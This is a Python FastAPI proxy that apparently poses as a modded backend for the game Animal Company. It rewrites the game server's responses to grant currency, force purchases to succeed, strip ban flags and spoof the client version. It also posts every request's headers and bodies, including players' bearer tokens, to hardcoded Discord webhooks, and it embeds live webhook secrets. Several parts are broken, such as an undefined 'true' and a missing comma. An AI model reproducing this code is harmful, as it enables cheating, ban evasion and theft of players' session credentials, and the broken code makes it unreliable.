from fastapi import FastAPI, Request, Response, WebSocket, HTTPException
from fastapi.responses import JSONResponse, FileResponse
from fastapi.middleware.cors import CORSMiddleware
import requests
import json
import logging
import os
import random
import uuid
import asyncio
from datetime import datetime
from typing import Optional, Dict, Any
import urllib.parse
import httpx
from websockets.client import connect as ws_connect

# Configuration
class Config:
    TARGET_BASE = 'https://animalcompany.us-east1.nakamacloud.io'  # Fixed: was 'Backend'
    WEBHOOK_URL = 'https://discord.com/api/webhooks/1396237802521497702/KAdoMOJY-rhXsSbgdwb2Gi6uN2kRXlNW4cVL0oOh83p-4n1Vj87B_KHWcgYuJK4J1kzU'  # Fixed: was 'Logs'
    WEBHOOK_URL2 = 'https://discord.com/api/webhooks/1396237812528971858/kf1lnJtB6HFF4Lt9zSNewf2MacdUld91-9Grimjn5W_uuMwCzkGeE-RNjnieeBU8uakb'
    LOG_DIR = "request_logs"
    MAINTENANCE_MODE = False  # Fixed: was 'bug'
    
    # Spoofed values
    SPOOFED_HARD_CURRENCY = 10000
    SPOOFED_SOFT_CURRENCY = 100000
    SPOOFED_RESEARCH_POINTS = 10000
    SPOOFED_GMU = "https://github.com/portalwww/API-Bot-Animal-Company/raw/refs/heads/main/game-data-prod/game-data-prod.zip"
    SPOOFED_GAMEDATA = "https://github.com/portalwww/API-Bot-Animal-Company/tree/main/game-data-prod"
    SPOOFED_PHOTONAPPID = "61f40a91-bccb-4639-b6ae-40b05ba3a984"
    SPOOFED_PHOTONVOICEID = "015b4c19-8d1e-4833-8911-8e0158bba6c1"
    
    # Version spoofing 
    SPOOFED_VERSION = "1.26.1.1394"
    SPOOFED_CLIENT_USER_AGENT = "MetaQuest_1.26.1.1394_0698af8b" # fixed, was a much later update. added support to "first lava update"

app = FastAPI(title="mooncompanybackend", version="2.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Logging setup
logging.basicConfig(
    filename='proxy_requests.log', 
    level=logging.DEBUG, 
    format='%(asctime)s - %(levelname)s - %(message)s'
)
os.makedirs(Config.LOG_DIR, exist_ok=True)

class RequestLogger:
    """Handles request/response logging with full header capture"""
    
    @staticmethod
    def log_to_file(route: str, method: str, request_data: Any, response_data: Any, status_code: int):
        """Logs request/response data to JSON file with full headers"""
        safe_route = route.replace('/', '_').strip('_')
        filename = os.path.join(Config.LOG_DIR, f"{safe_route}.json")
        
        log_entry = {
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "method": method,
            "route": route,
            "request": request_data,
            "response": response_data,
            "status_code": status_code
        }
        
        try:
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(json.dumps(log_entry, indent=2) + ",\n")
        except Exception as e:
            logging.error(f"Failed to log to file: {e}")

    @staticmethod
    def send_webhook(title: str, request_data: Dict, response_data: Dict = None, error: str = None):
        try:
            request_headers_str = ""
            if "headers" in request_data:
                request_headers_str = "\n".join([f"{k}: {v}" for k, v in request_data["headers"].items()])
            
            embeds = [{
                "title": "Request",
                "fields": [
                    {"name": "Method", "value": request_data.get("method", "Unknown")},
                    {"name": "URL", "value": request_data.get("url", "Unknown")},
                    {"name": "Headers", "value": request_headers_str[:1000] if request_headers_str else "None"},
                    {"name": "Body", "value": str(request_data.get("body", ""))[:800]}
                ]
            }]
            
            if response_data:
                response_headers_str = ""
                if "headers" in response_data:
                    response_headers_str = "\n".join([f"{k}: {v}" for k, v in response_data["headers"].items()])
                
                embeds.append({
                    "title": "Response",
                    "fields": [
                        {"name": "Status", "value": str(response_data.get("status_code", "Unknown"))},
                        {"name": "Headers", "value": response_headers_str[:1000] if response_headers_str else "None"},
                        {"name": "Body", "value": str(response_data.get("body", ""))[:800]}
                    ]
                })
            
            if error:
                embeds.append({
                    "title": "Error",
                    "fields": [{"name": "Message", "value": error}]
                })
            
            payload = {"content": title, "embeds": embeds}
            
            requests.post(Config.WEBHOOK_URL, json=payload, timeout=5)
        except Exception as e:
            logging.error(f"Webhook failed: {e}")


class OnlineStatusChecker:
    """Handles checking online status and inventory injection"""
    
    @staticmethod
    async def check_online_status(token: str):
        """Check if user is online using the token"""
        try:
            headers = {
                'Authorization': f'Bearer {token}',
                'Content-Type': 'application/json'
            }
            
            response = requests.get(
                Config.TARGET_BASE,  # Fixed: use TARGET_BASE
                headers=headers,
                timeout=10
            )
            
            response_text = response.text.lower()
            
            # Check for online status
            if 'online' in response_text or '"online": true' in response_text:
                logging.info("User is online, waiting 20 seconds before inventory injection")
                await asyncio.sleep(20)
                return True
            else:
                logging.info("User not online yet, checking again in 5 seconds")
                await asyncio.sleep(5)
                return False
                
        except Exception as e:
            logging.error(f"Failed to check online status: {e}")
            await asyncio.sleep(5)
            return False
    
    @staticmethod
    async def wait_for_online_and_inject(token: str):
        """Wait for user to be online, then inject inventory"""
        try:
            while True:
                is_online = await OnlineStatusChecker.check_online_status(token)
                if is_online:
                    # User is online, inject inventory
                    inventory_payload = GameDataSpoofer.create_inventory_payload()
                    logging.info("Injecting inventory payload after online detection")
                    # Send webhook notification about inventory injection
                    RequestLogger.send_webhook(
                        "📦 Inventory Injected",
                        {"message": "User came online, inventory payload injected"},
                        {"inventory": inventory_payload}
                    )
                    break
        except Exception as e:
            logging.error(f"Error in wait_for_online_and_inject: {e}")

class GameDataSpoofer:
    """Handles game data spoofing and modifications"""
    
    @staticmethod
    def create_inventory_payload():
        try:
            # Load econ items from game-data-prod folder
            items_file = os.path.join("game-data-prod", "econ_gameplay_items.json")
            if not os.path.exists(items_file):
                logging.warning("econ_gameplay_items.json not found, using default items")
                item_ids = ["item_backpack_large_base", "item_default_1", "item_default_2"]
            else:
                with open(items_file, "r") as f:
                    data = json.load(f)
                item_ids = [item["id"] for item in data if "id" in item]
        except Exception as e:
            logging.error(f"Failed to load econ items: {e}")
            return {"error": "Could not load inventory items"}

        children = [{
            "itemID": item_ids[i % len(item_ids)],
            "scaleModifier": 100,
            "colorHue": 50,
            "colorSaturation": 50
        } for i in range(min(20, len(item_ids)))]

        return {
            "objects": [{
                "collection": "user_inventory",
                "key": "gameplay_loadout",
                "permission_read": 1,
                "permission_write": 1,
                "value": json.dumps({
                    "version": 1,
                    "back": {
                        "itemID": "item_backpack_large_base",
                        "scaleModifier": 120,
                        "colorHue": 50,
                        "colorSaturation": 50,
                        "children": children
                    }
                })
            }]
        }

    @staticmethod
    def spoof_wallet_data(wallet_data):
        """Spoofs wallet data with unlimited currency"""
        if isinstance(wallet_data, str):
            try:
                wallet = json.loads(wallet_data)
            except:
                wallet = {}
        else:
            wallet = wallet_data or {}
            
        wallet.update({
            'hardCurrency': Config.SPOOFED_HARD_CURRENCY,
            'softCurrency': Config.SPOOFED_SOFT_CURRENCY,
            'researchPoints': Config.SPOOFED_RESEARCH_POINTS
        })
        
        return json.dumps(wallet) if isinstance(wallet_data, str) else wallet

    @staticmethod
    def spoof_mining_balance(payload_data):
        """Spoofs mining balance to give max resources""" 
        if isinstance(payload_data, str):
            try:
                data = json.loads(payload_data)
            except:
                data = {}
        else:
            data = payload_data or {}
            
        data.update({
            'hardCurrency':  Config.SPOOFED_HARD_CURRENCY,
            'researchPoints':  Config.SPOOFED_RESEARCH_POINTS
        })
        
        return json.dumps(data) if isinstance(payload_data, str) else data

    @staticmethod
    def spoof_version_data(data):
        """Spoofs version information in requests and responses"""
        if isinstance(data, str):
            try:
                json_data = json.loads(data)
            except:
                return data
        else:
            json_data = data
            
        # Version spoof 
        if isinstance(json_data, dict):
            if 'vars' in json_data and isinstance(json_data['vars'], dict):
                if 'clientUserAgent' in json_data['vars']:
                    json_data['vars']['clientUserAgent'] = Config.SPOOFED_CLIENT_USER_AGENT
                    logging.info(f"Spoofed clientUserAgent to: {Config.SPOOFED_CLIENT_USER_AGENT}")
                
                # Also spoof any version fields
                if 'version' in json_data['vars']:
                    json_data['vars']['version'] = Config.SPOOFED_VERSION
                if 'clientVersion' in json_data['vars']:
                    json_data['vars']['clientVersion'] = Config.SPOOFED_VERSION
            
            # Spoof version in response data
            if 'version' in json_data:
                json_data['version'] = Config.SPOOFED_VERSION
            if 'clientVersion' in json_data:
                json_data['clientVersion'] = Config.SPOOFED_VERSION
            if 'gameVersion' in json_data:
                json_data['gameVersion'] = Config.SPOOFED_VERSION
        
        return json.dumps(json_data) if isinstance(data, str) else json_data

class ProxyHandler:
    """Handles HTTP request proxying and forwarding"""
    
    @staticmethod
    def dict_from_headers(headers):
        return {k: v for k, v in headers.items()}
    
    @staticmethod
    async def forward_request(path: str, request: Request, spoof_function=None, spoof_request_body=False):
        method = request.method
        target_url = f"{Config.TARGET_BASE}/{path.lstrip('/')}"
        
        # Log incoming headers
        incoming_headers = ProxyHandler.dict_from_headers(request.headers)       
        headers = {
            k: v for k, v in request.headers.items()
            if k.lower() not in ['host', 'content-length', 'transfer-encoding']
        }
        headers["Host"] = "animalcompany.us-east1.nakamacloud.io"
        
        try:
            data = await request.body()
        except Exception as e:
            logging.error(f"Failed to read request body: {e}")
            data = b""
        
        if spoof_request_body and data:
            try:
                original_body = data.decode('utf-8', errors='ignore')
                spoofed_body = GameDataSpoofer.spoof_version_data(original_body)
                data = spoofed_body.encode('utf-8')
                headers['Content-Length'] = str(len(data))
            except Exception as e:
                logging.error(f"Failed to spoof request body: {e}")
        
        request_info = {
            "method": method,
            "url": target_url,
            "headers": incoming_headers,  
            "body": data.decode('utf-8', errors='ignore')
        }
        
        try:
            response = requests.request(
                method=method,
                url=target_url,
                headers=headers,
                data=data,
                allow_redirects=False,
                timeout=30
            )
            
            response_headers_dict = ProxyHandler.dict_from_headers(response.headers)
            
            forward_headers = {
                k: v for k, v in response.headers.items()
                if k.lower() not in ['content-encoding', 'transfer-encoding', 'connection']
            }
            
            response_content = response.content
            if spoof_function and 'application/json' in response.headers.get('Content-Type', ''):
                try:
                    json_data = response.json()
                    spoofed_data = spoof_function(json_data)
                    response_content = json.dumps(spoofed_data).encode()
                    forward_headers['Content-Length'] = str(len(response_content))
                except Exception as e:
                    logging.error(f"Spoofing failed: {e}")
            
            response_info = {
                "status_code": response.status_code,
                "headers": response_headers_dict,  
                "body": response.text
            }
            
            # Log to file
            RequestLogger.log_to_file(
                path, method, request_info, response_info, response.status_code
            )
            
            # Send webhook notification
            RequestLogger.send_webhook(
                f"🔄 {method} {path}", 
                request_info, 
                response_info
            )
            
            return Response(
                content=response_content,
                status_code=response.status_code,
                headers=forward_headers,
                media_type=forward_headers.get("Content-Type")
            )
            
        except Exception as e:
            error_msg = f"Proxy Error: {str(e)}"
            logging.error(error_msg)
            
            RequestLogger.send_webhook(
                f"❌ Proxy Request Failed", 
                request_info, 
                error=error_msg
            )
            
            return JSONResponse(
                content={"error": "Proxy Error", "details": str(e)}, 
                status_code=502
            )

# Middleware
@app.middleware("http")
async def log_headers_middleware(request: Request, call_next):
    headers_dict = dict(request.headers)
    
    log_data = {
        "method": request.method,
        "url": str(request.url),
        "headers": headers_dict
    }

    formatted_log = json.dumps(log_data, indent=2)

    # Send to Discord webhook
    try:
        async with httpx.AsyncClient() as client:
            await client.post(Config.WEBHOOK_URL2, json={
                "content": f"**Incoming Request:**\n```json\n{formatted_log}\n```"
            })
    except Exception as e:
        print("Failed to send log to Discord:", e)

    response = await call_next(request)
    return response

@app.get("/")
async def root():
    return {"message": "everything worked!"}

# Static file endpoints
@app.get("/data/game-data-prod.zip")
async def serve_game_data():
    """Serve game-data-prod.zip directly from GitHub"""
    github_zip_url = Config.GMU
    
    try:
        response = requests.get(github_zip_url, timeout=10)
        response.raise_for_status()
        return Response(
            content=response.content,
            media_type="application/zip",
            headers={"Content-Disposition": "attachment; filename=game-data-prod.zip"}
        )
    except requests.exceptions.RequestException as e:
        return JSONResponse({"error": f"Failed to fetch ZIP from GitHub: {str(e)}"}, status_code=500)


@app.get("/econ/items")
async def get_econ_items():
    """Fetch econ_gameplay_items.json from GitHub"""
    github_url = f"{Config.SPOOFED_GAMEDATA}/econ_gameplay_items.json"
    
    try:
        response = requests.get(github_url, timeout=5)
        response.raise_for_status()
        data = response.json()
        return JSONResponse(content=data)
    
    except requests.exceptions.RequestException as e:
        return JSONResponse({"error": f"Failed to fetch from GitHub: {str(e)}"}, status_code=500)


# Version endpoints
@app.get("/version")
async def get_version():
    """Returns spoofed version information"""
    return JSONResponse({
        "version": Config.SPOOFED_VERSION,
        "clientVersion": Config.SPOOFED_VERSION,
        "gameVersion": Config.SPOOFED_VERSION,
        "clientUserAgent": Config.SPOOFED_CLIENT_USER_AGENT,
        "spoofed": True
    })

@app.get("/v2/version")
async def get_version_v2():
    """Returns spoofed version information (v2 endpoint)"""
    return JSONResponse({
        "version": Config.SPOOFED_VERSION,
        "clientVersion": Config.SPOOFED_VERSION,
        "gameVersion": Config.SPOOFED_VERSION,
        "clientUserAgent": Config.SPOOFED_CLIENT_USER_AGENT,
        "spoofed": True
    })

@app.api_route("/{full_path:path}", methods=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"])
async def proxy(full_path: str, request: Request):
    target_url = f"{Config.TARGET_BASE}/{full_path}"
    method = request.method
    headers = dict(request.headers)
    headers.pop("host", None)  # Avoid sending local host header

    # Read body if present
    body = await request.body()

    async with httpx.AsyncClient(follow_redirects=True) as client:
        resp = await client.request(
            method=method,
            url=target_url,
            headers=headers,
            content=body,
            params=request.query_params,
        )

    # Return response back to the client
    return resp.text, resp.status_code, resp.headers.items()

# WebSocket endpoint
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    """WebSocket proxy for real-time game communication"""
    await websocket.accept()
    ws_headers = ProxyHandler.dict_from_headers(websocket.headers)
    logging.info(f"WebSocket connection headers: {json.dumps(ws_headers, indent=2)}")
    
    token = websocket.query_params.get("token")
    if not token:
        await websocket.close(code=1008)
        return
    
    try:
        encoded_token = urllib.parse.quote(token)
        target_ws_url = f"wss://animalcompany.us-east1.nakamacloud.io/ws?lang=en&status=True&token={encoded_token}"
        
        async with ws_connect(target_ws_url) as target_ws:
            async def forward_to_client():
                async for message in target_ws:
                    await websocket.send_text(message)
            
            async def forward_to_server():
                while True:
                    try:
                        message = await websocket.receive_text()
                        await target_ws.send(message)
                    except Exception as e:
                        logging.error(f"WebSocket client error: {e}")
                        break
            
            # Run both forwarding tasks concurrently
            await asyncio.gather(
                forward_to_client(),
                forward_to_server(),
                return_exceptions=True
            )
                
    except Exception as e:
        logging.error(f"WebSocket error: {e}")
        await websocket.send_text(f"WebSocket Error: {e}")
        await websocket.close()

#@app.api_route("/", methods=["GET", "POST"])
#async def autism():
    #return JSONResponse(content="worked", status_code=200)

# Game API endpoints with spoofing
@app.post('/v2/account/authenticate/custom')
async def authenticate_custom(request: Request):
    """Custom authentication with inventory spoofing and version spoofing"""
    if Config.MAINTENANCE_MODE:
        return Response(
            content="Maintenance mode - testing is over", 
            status_code=503, 
            media_type='text/plain'
        )
    
    def spoof_auth_response(response_data):
        if 'token' in response_data:
            token = response_data['token']
            # Start background task for inventory injection
            asyncio.create_task(OnlineStatusChecker.wait_for_online_and_inject(token))
            
            # Add inventory payload to response
            response_data['inventory'] = GameDataSpoofer.create_inventory_payload()
        
        # Add version spoofing
        response_data['version'] = Config.SPOOFED_VERSION
        response_data['clientVersion'] = Config.SPOOFED_VERSION
        
        return response_data

    return await ProxyHandler.forward_request(
        'v2/account/authenticate/custom', 
        request, 
        spoof_auth_response, 
        spoof_request_body=True
    )

@app.api_route('/v2/account', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
async def account_endpoint(request: Request):
    """Account endpoint with wallet spoofing and version spoofing"""

    def spoof_account_data(response_data):
        # Add moon_company prefix to display name
        if 'user' in response_data and 'display_name' in response_data['user']:
            response_data['user']['display_name'] = 'mooncompany' + response_data['user']['display_name']
        
        if 'isdev' in response_data:
            response_data['isdev'] = true

        # Override display name for specific user
        if 'iKDO.19' in json.dumps(response_data):
            response_data['user']['display_name'] = '<color=red>MoonCompanyOWNER</color>'

        # Remove all banned-related keys
        banned_keys = ['banned', 'IsBanned', 'Banned', 'BANNED']

        # Remove from top-level
        for key in banned_keys:
            if key in response_data:
                del response_data[key]

        # Remove from user subdict if present
        if 'user' in response_data and isinstance(response_data['user'], dict):
            for key in banned_keys:
                if key in response_data['user']:
                    del response_data['user'][key]

        # Spoof wallet data (check both 'wallet' and 'Wallet')
        if 'wallet' in response_data:
            response_data['wallet'] = GameDataSpoofer.spoof_wallet_data(response_data['wallet'])
        elif 'Wallet' in response_data:
            response_data['Wallet'] = GameDataSpoofer.spoof_wallet_data(response_data['Wallet'])

        # Add version spoofing
        response_data['version'] = Config.SPOOFED_VERSION
        response_data['clientVersion'] = Config.SPOOFED_VERSION

        return response_data

    return await ProxyHandler.forward_request(
        'v2/account',
        request,
        spoof_account_data,
        spoof_request_body=True
    )


@app.get('/v2/rpc/mining.balance')
async def mining_balance(request: Request):
    """Mining balance with unlimited resources"""
    def spoof_mining_data(response_data):
        if 'payload' in response_data:
            response_data['payload'] = GameDataSpoofer.spoof_mining_balance(response_data['payload'])
        return response_data
    
    return await ProxyHandler.forward_request('v2/rpc/mining.balance', request, spoof_mining_data)

@app.post('/v2/rpc/purchase.avatarItems')
async def purchase_avatar_items(request: Request):
    """Avatar item purchases - always succeed"""
    def spoof_purchase_response(response_data):
        response_data['succeeded'] = True
        response_data['errorCode'] = None
        return response_data
    
    return await ProxyHandler.forward_request('v2/rpc/purchase.avatarItems', request, spoof_purchase_response)

@app.api_route('/v2/rpc/clientBootstrap', methods=['GET', 'POST'])
async def client_bootstrap(request: Request):
    """Client bootstrap with version spoofing"""
    def spoof_bootstrap_response(response_data):
        if 'payload' in response_data:
            try:
                if isinstance(response_data['payload'], str):
                    payload = json.loads(response_data['payload'])
                else:
                    payload = response_data['payload']
                
                # Spoof version information
                payload['version'] = Config.SPOOFED_VERSION
                payload['clientVersion'] = Config.SPOOFED_VERSION
                payload['gameVersion'] = Config.SPOOFED_VERSION
                payload['minVersion'] = Config.SPOOFED_VERSION
                payload['requiredVersion'] = Config.SPOOFED_VERSION
                payload['gameDataURL'] = Config.SPOOFED_GMU
                
                response_data['payload'] = json.dumps(payload) if isinstance(response_data['payload'], str) else payload
            except Exception as e:
                logging.error(f"Failed to spoof bootstrap payload: {e}")
        
        return response_data
    
    return await ProxyHandler.forward_request(
        'v2/rpc/clientBootstrap', 
        request, 
        spoof_bootstrap_response, 
        spoof_request_body=True
    )

# Forward endpoints
FORWARD_ENDPOINTS = [
    '/v2/rpc/attest.start',
    '/v2/rpc/avatar.update',
    '/v2/notification',
    '/v2/rpc/purchase.stashUpgrade',
    '/v2/rpc/updateWalletSoftCurrency',
    '/v2/account/session/refresh',
    '/v2/account/authenticate/device',
    '/v2/storage',
    '/v2/rpc/purchase.list',
    '/v2/storage/econ_avatar_items',
    '/v2/storage/econ_products',
    '/v2/storage/econ_gameplay_items',
    '/v2/storage/econ_research_nodes',
    '/v2/user',
    '/v2/friend',
    '/v2/friend/block'
    '/v2/rpc/research.unlock'
]

# Create dynamic routes for all forward endpoints
def create_forward_route(endpoint):
    async def forward_generic(request: Request):
        query_params = str(request.url.query)
        path = f"{endpoint.lstrip('/')}?{query_params}" if query_params else endpoint.lstrip('/')
        return await ProxyHandler.forward_request(path, request)
    return forward_generic

for endpoint in FORWARD_ENDPOINTS:
    app.add_api_route(endpoint, create_forward_route(endpoint), methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])

@app.get("/health")
async def health_check():
    """Health check endpoint"""
    return {
        "status": "running",
        "proxy_target": Config.TARGET_BASE,
        "spoofing": "active",
        "maintenance": Config.MAINTENANCE_MODE,
        "version_spoofing": Config.SPOOFED_VERSION,
        "client_user_agent": Config.SPOOFED_CLIENT_USER_AGENT,
        "header_logging": "enabled",
        "online_checking": "enabled",
        "timestamp": datetime.utcnow().isoformat()
    }

if __name__ == '__main__':
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8080)
